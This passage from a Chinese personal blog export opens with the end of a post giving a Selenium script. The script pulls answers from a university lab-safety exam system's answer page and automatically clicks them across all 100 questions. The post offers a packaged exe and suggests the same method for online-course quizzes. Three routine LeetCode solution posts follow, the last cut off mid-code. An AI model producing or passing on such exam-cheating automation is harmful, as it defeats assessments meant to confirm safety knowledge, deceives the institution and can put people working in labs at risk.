class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;输入错误，请重输！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#提取问题，定位的是第一个元素不是一个列表，改用其他方法</span></span><br><span class="line">    <span class="comment">#question=dr.find_element_by_class_name(&#x27;shiti&#x27;).text[2:-4]</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取答案</span></span><br><span class="line">    url=<span class="string">&quot;http://aqks.neu.edu.cn/redir.php?catalog_id=6&amp;cmd=dajuan_chakan&amp;huihuabh=69338&amp;mode=test&quot;</span></span><br><span class="line">    response=requests.get(url)</span><br><span class="line">    response.encoding=<span class="string">&#x27;gbk&#x27;</span><span class="comment">#网页是gbk编码</span></span><br><span class="line">    answer_source=response.text</span><br><span class="line">    <span class="comment">#去掉所有的空白符，包括换行符和空格、制表符</span></span><br><span class="line">    answer_source=re.sub(<span class="string">&#x27;\s&#x27;</span>,<span class="string">&#x27;&#x27;</span>,answer_source)</span><br><span class="line">    <span class="comment">#print(answer_source)</span></span><br><span class="line">    <span class="comment">#共有10页，每页10题</span></span><br><span class="line">    page=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(page&lt;<span class="number">10</span>):</span><br><span class="line">        <span class="comment">#获取当前页面源码（答题页）</span></span><br><span class="line">        page_source=dr.page_source</span><br><span class="line">        tree=etree.HTML(page_source)</span><br><span class="line">        question_list=tree.xpath(<span class="string">&#x27;//h3&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            question=question_list[i]</span><br><span class="line">            <span class="comment">#因为最大题号是100，再加上符号，所以从4开始截取</span></span><br><span class="line">            question=question.xpath(<span class="string">&#x27;string(.)&#x27;</span>)[<span class="number">4</span>:]</span><br><span class="line">            <span class="comment">#有的问题也会带有空格，先处理掉</span></span><br><span class="line">            question=re.sub(<span class="string">&#x27;\s&#x27;</span>,<span class="string">&#x27;&#x27;</span>,question)</span><br><span class="line">            <span class="comment">#搜索答案</span></span><br><span class="line">            answer=search_answer(answer_source,question)</span><br><span class="line">            <span class="comment">#print(answer)</span></span><br><span class="line">            <span class="keyword">if</span>(len(answer)==<span class="number">0</span>):</span><br><span class="line">                print(<span class="string">&quot;第&quot;</span>+str(<span class="number">10</span>*page+i+<span class="number">1</span>)+<span class="string">&quot;题未搜索到答案!&quot;</span>)</span><br><span class="line">                print(<span class="string">&quot;问题是：&quot;</span>+question)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            answer=answer[<span class="number">0</span>]</span><br><span class="line">            <span class="comment">#拼接按钮元素的id</span></span><br><span class="line">            id=<span class="string">&#x27;ti_&#x27;</span>+str(<span class="number">10</span>*page+i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> answer==<span class="string">&#x27;错误&#x27;</span> <span class="keyword">or</span> answer==<span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">                id=id+<span class="string">&#x27;_0&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> answer==<span class="string">&#x27;正确&#x27;</span> <span class="keyword">or</span> answer==<span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">                id=id+<span class="string">&#x27;_1&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> answer==<span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">                id=id+<span class="string">&#x27;_2&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> answer==<span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">                id=id+<span class="string">&#x27;_3&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&quot;搜索答案失败！！！&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dr.find_element_by_id(id).click()</span><br><span class="line">        <span class="keyword">if</span> page==<span class="number">0</span>:</span><br><span class="line">            <span class="comment">#第一页时，点击下一页是input[1],其它页面是input[2]</span></span><br><span class="line">            path=<span class="string">&#x27;//*[@id=&quot;dati&quot;]/div[11]/input[1]&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path=<span class="string">&#x27;//*[@id=&quot;dati&quot;]/div[11]/input[2]&#x27;</span></span><br><span class="line">        dr.find_element_by_xpath(path).click()</span><br><span class="line">        page=page+<span class="number">1</span></span><br><span class="line">    <span class="comment">#答题页面共有10页</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<h6 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h6><p>程序运行过程中会调出chrome浏览器，可以看到程序自动答题过程，答题结束会询问是否提交需要手动确定提交，另外需要用到一个Chrome浏览器驱动程序需要和自己的chrome浏览器版本匹配，<a href="http://chromedriver.storage.googleapis.com/index.html">点我下载</a>，下载后要配置环境变量或者直接放到已经在环境变量里的目录中。如果没有python环境用我打包好的exe程序，<a href="/video/lab_safe.exe">点击下载</a>，不需要python环境就可运行，不过还是需要下载上面chrome浏览器驱动😎</p>
<p>下面这张图是程序自动答题提交后的结果，满分。。。因为已经答过题了所以是用模拟考试测试的🙂</p>
<p><img src="/2020/10/26/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%AE%89%E5%85%A8%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%8A%A8%E7%AD%94%E9%A2%98/image-20201026145032142.png" alt="image-20201026145032142"></p>
<p>下面是程序自动答题的运行过程，插入视频的dplayer插件也整了好久不过还好成功了😝，浏览器播放不了MP4，需要使用格式工厂把mp4格式视频的编码转换成H264编码。。。</p>
<div id="dplayer1" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer1"),"hotkey":true,"preload":"metadata","video":{"url":"/video/answer.mp4","pic":"/video/cover.png"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script> 
<p>仅此记录一下，以后如果有其他类似的需求可以参考一下，比如网课答题？？😂</p>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>将数字变成0的操作次数</title>
    <url>/2020/11/09/%E5%B0%86%E6%95%B0%E5%AD%97%E5%8F%98%E6%88%900%E7%9A%84%E6%93%8D%E4%BD%9C%E6%AC%A1%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/number-of-steps-to-reduce-a-number-to-zero/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个非负整数 <code>num</code> ，请你返回将它变成 0 所需要的步数。 如果当前数字是偶数，你需要把它除以 2 ；否则，减去 1 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 14</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">步骤 1) 14 是偶数，除以 2 得到 7 。</span><br><span class="line">步骤 2） 7 是奇数，减 1 得到 6 。</span><br><span class="line">步骤 3） 6 是偶数，除以 2 得到 3 。</span><br><span class="line">步骤 4） 3 是奇数，减 1 得到 2 。</span><br><span class="line">步骤 5） 2 是偶数，除以 2 得到 1 。</span><br><span class="line">步骤 6） 1 是奇数，减 1 得到 0 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 8</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">步骤 1） 8 是偶数，除以 2 得到 4 。</span><br><span class="line">步骤 2） 4 是偶数，除以 2 得到 2 。</span><br><span class="line">步骤 3） 2 是偶数，除以 2 得到 1 。</span><br><span class="line">步骤 4） 1 是奇数，减 1 得到 0 。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 123</span><br><span class="line">输出：12</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>0 &lt;= num &lt;= 10^6</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据题目描述直接模拟就行了，while循环判断是否为0，循环中判断奇偶然后进行相关操作。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.3M，击败5.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numberOfSteps</span> <span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(num)&#123;</span><br><span class="line">            <span class="comment">//偶数</span></span><br><span class="line">            <span class="keyword">if</span>(num%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                num/=<span class="number">2</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                --num;</span><br><span class="line">            &#125;</span><br><span class="line">            ++result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，题目比较简单，根据题意直接模拟就好了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>将每个元素替换为右侧最大元素</title>
    <url>/2020/11/13/%E5%B0%86%E6%AF%8F%E4%B8%AA%E5%85%83%E7%B4%A0%E6%9B%BF%E6%8D%A2%E4%B8%BA%E5%8F%B3%E4%BE%A7%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/replace-elements-with-greatest-element-on-right-side/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>arr</code> ，请你将每个元素用它右边最大的元素替换，如果是最后一个元素，用 <code>-1</code> 替换。</p>
<p>完成所有替换操作后，请你返回这个数组。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [17,18,5,4,6,1]</span><br><span class="line">输出：[18,6,6,6,1,-1]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= arr.length &lt;= 10^4</code></li>
<li><code>1 &lt;= arr[i] &lt;= 10^5</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接模拟，遍历数组，对每一个元素找到它右边最大元素并替换，最后一个用-1替换。</p>
<p><strong>c++代码：</strong>(执行用时1664ms，击败5.05%，内存消耗14.1M，击败16.20%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">replaceElements</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历数组中的元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.size()<span class="number">-1</span>;++i)&#123;</span><br><span class="line">            <span class="comment">//找到右边最大的元素</span></span><br><span class="line">            <span class="keyword">int</span> tmp=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;arr.size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[j]&gt;tmp)&#123;</span><br><span class="line">                    tmp=arr[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//用右边最大元素替换当前元素</span></span><br><span class="line">            arr[i]=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//最后一个元素用-1替换</span></span><br><span class="line">        arr[arr.size()<span class="number">-1</span>]=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/replace-elements-with-greatest-element-on-right-side/solution/jiang-mei-ge-yuan-su-ti-huan-wei-you-ce-zui-da-y-5/">官方题解</a>:</h6><p><strong>方法一：逆序遍历</strong></p>
<p><strong>思路与算法</strong></p>
<p>本题等价于对于数组 <code>arr</code> 中的每个元素 <code>arr[i]</code>，将其替换成 <code>arr[i + 1], arr[i + 2], ..., arr[n - 1]</code> 中的最大值。因此我们可以逆序地遍历整个数组，同时维护从数组右端到当前位置所有元素的最大值。</p>
<p>设 <code>ans[i] = max(arr[i + 1], arr[i + 2], ..., arr[n - 1])</code>，那么在进行逆序遍历时，我们可以直接通过</p>
<p><code>ans[i] = max(ans[i + 1], arr[i + 1])</code><br>来递推地得到答案。</p>
<p><strong>c++代码：</strong>(执行用时32ms，击败62.78%，内存消耗14.2M，击败15.02%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">replaceElements</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = arr.size();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">ans</span><span class="params">(n)</span></span>;</span><br><span class="line">        ans[n - <span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            ans[i] = max(ans[i + <span class="number">1</span>], arr[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>复杂度分析</p>
<p>时间复杂度：$O(N)$，其中 $N$ 是数组 $arr$ 的长度。</p>
<p>空间复杂度：$O(1)$，除了存储答案的数组 $ans$ 之外，额外的空间复杂度是 $O(1)$。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我的解法太暴力了🤣，效率太低。官方题解逆序遍历这个思路真妙,厉害。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>岛屿的周长</title>
    <url>/2020/11/23/%E5%B2%9B%E5%B1%BF%E7%9A%84%E5%91%A8%E9%95%BF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/island-perimeter/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个 <code>row x col</code> 的二维网格地图 <code>grid</code> ，其中：<code>grid[i][j] = 1</code> 表示陆地， <code>grid[i][j] = 0</code> 表示水域。</p>
<p>网格中的格子 <strong>水平和垂直</strong> 方向相连（对角线方向不相连）。整个网格被水完全包围，但其中恰好有一个岛屿（或者说，一个或多个表示陆地的格子相连组成的岛屿）。</p>
<p>岛屿中没有“湖”（“湖” 指水域在岛屿内部且不和岛屿周围的水相连）。格子是边长为 1 的正方形。网格为长方形，且宽度和高度均不超过 100 。计算这个岛屿的周长。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/23/%E5%B2%9B%E5%B1%BF%E7%9A%84%E5%91%A8%E9%95%BF/island.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[0,1,0,0],[1,1,1,0],[0,1,0,0],[1,1,0,0]]</span><br><span class="line">输出：16</span><br><span class="line">解释：它的周长是上面图片中的 16 个黄色的边</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[1]]</span><br><span class="line">输出：4</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[1,0]]</span><br><span class="line">输出：4</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>row == grid.length</code></li>
<li><code>col == grid[i].length</code></li>
<li><code>1 &lt;= row, col &lt;= 100</code></li>
<li><code>grid[i][j]</code> 为 <code>0</code> 或 1</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>分析网格图我们可以看出一格本来是四条边都要算周长的，若它上方有格则它上面这条边就不算周长了变成了3条有效边了，下方和左右两方也是一样的，所以得到如下思路。</p>
<p>遍历二维网格中的每一块，如果当前块为陆地1，则依次判断上下左右是否有相邻块，每相邻一个初始值4就减去1，最后把当前块的有效边数加到周长上，遍历结束时返回周长。</p>
<p><strong>c++代码：</strong>(执行用时192ms，击败90.14%，内存消耗94.2M，击败34.26%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">islandPerimeter</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> row=grid.size();</span><br><span class="line">        <span class="keyword">int</span> col=grid[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;row;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;col;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j]==<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="comment">//每个块4条边</span></span><br><span class="line">                    <span class="keyword">int</span> tmp=<span class="number">4</span>;</span><br><span class="line">                    <span class="keyword">if</span>(i<span class="number">-1</span>&gt;=<span class="number">0</span> &amp;&amp; grid[i<span class="number">-1</span>][j]==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="comment">//上格元素是1,当前块去掉上面一条边</span></span><br><span class="line">                        --tmp;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(i+<span class="number">1</span>&lt;row &amp;&amp; grid[i+<span class="number">1</span>][j]==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="comment">//下格元素是1</span></span><br><span class="line">                        --tmp;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(j<span class="number">-1</span>&gt;=<span class="number">0</span> &amp;&amp; grid[i][j<span class="number">-1</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="comment">//左格元素是1</span></span><br><span class="line">                        --tmp;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(j+<span class="number">1</span>&lt;col &amp;&amp; grid[i][j+<span class="number">1</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="comment">//右格元素是1</span></span><br><span class="line">                        --tmp;</span><br><span class="line">                    &#125;</span><br><span class="line">                    result+=tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/island-perimeter/solution/dao-yu-de-zhou-chang-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：迭代</strong></p>
<p><strong>思路与算法</strong></p>
<p>对于一个陆地格子的每条边，它被算作岛屿的周长当且仅当这条边为网格的边界或者相邻的另一个格子为水域。 因此，我们可以遍历每个陆地格子，看其四个方向是否为边界或者水域，如果是，将这条边的贡献（即 $1$）加入答案 $\textit{ans}$中即可。</p>
<p><strong>c++代码：</strong>(执行用时232ms，击败31.64%，内存消耗94.2M，击败49.13%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="keyword">constexpr</span> <span class="keyword">static</span> <span class="keyword">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">constexpr</span> <span class="keyword">static</span> <span class="keyword">int</span> dy[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">islandPerimeter</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = grid.size(), m = grid[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k) &#123;</span><br><span class="line">                        <span class="keyword">int</span> tx = i + dx[k];</span><br><span class="line">                        <span class="keyword">int</span> ty = j + dy[k];</span><br><span class="line">                        <span class="keyword">if</span> (tx &lt; <span class="number">0</span> || tx &gt;= n || ty &lt; <span class="number">0</span> || ty &gt;= m || !grid[tx][ty]) &#123;</span><br><span class="line">                            cnt += <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ans += cnt;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(nm)$，其中 n 为网格的高度，$m$ 为网格的宽度。我们需要遍历每个格子，每个格子要看其周围 $4$ 个格子是否为岛屿，因此总时间复杂度为 $O(4nm)=O(nm)$。</p>
</li>
<li><p>空间复杂度：$O(1)$。只需要常数空间存放若干变量。</p>
</li>
</ul>
<p><strong>方法二：深度优先搜索</strong></p>
<p><strong>思路与算法</strong></p>
<p>我们也可以将方法一改成深度优先搜索遍历的方式，此时遍历的方式可扩展至统计多个岛屿各自的周长。需要注意的是为了防止陆地格子在深度优先搜索中被重复遍历导致死循环，我们需要将遍历过的陆地格子标记为已经遍历过，下面的代码中我们设定值为 $2$ 的格子为已经遍历过的陆地格子。</p>
<p><strong>c++代码：</strong>(执行用时224ms，击败41.57%，内存消耗94.6M，击败13.01%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="keyword">constexpr</span> <span class="keyword">static</span> <span class="keyword">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">constexpr</span> <span class="keyword">static</span> <span class="keyword">int</span> dy[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;grid, <span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= n || y &lt; <span class="number">0</span> || y &gt;= m || grid[x][y] == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (grid[x][y] == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        grid[x][y] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> tx = x + dx[i];</span><br><span class="line">            <span class="keyword">int</span> ty = y + dy[i];</span><br><span class="line">            res += dfs(tx, ty, grid, n, 